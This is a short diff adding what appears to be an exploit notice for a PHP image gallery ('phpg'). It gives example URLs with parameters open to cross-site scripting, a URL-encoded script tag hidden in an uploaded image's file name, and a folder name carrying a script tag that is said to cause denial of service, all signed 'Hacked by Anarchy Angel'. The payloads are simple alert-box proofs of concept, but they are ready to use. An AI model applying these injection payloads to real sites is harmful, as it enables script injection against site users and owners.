@@ -1,0 +1,10 @@
+For the cross-site-scripting issues:
+
+http://www.example.com/phpg/index.php?url=&quot;&gt; [XSS]
+http://www.example.com/phpg/main-display-file.php?file= [XSS]
+
+For the script-injection issue:
+filename : %3Cscript%3Ealert%28%22Hacked%20by%20Anarchy%20Angel%22%29%3B%3C%2Fscript%3E.jpg
+
+For the denial-of-service issue:
+Make or rename a folder with the name &lt; script &gt;alert(&#039;Hacked by Anarchy Angel&#039;)
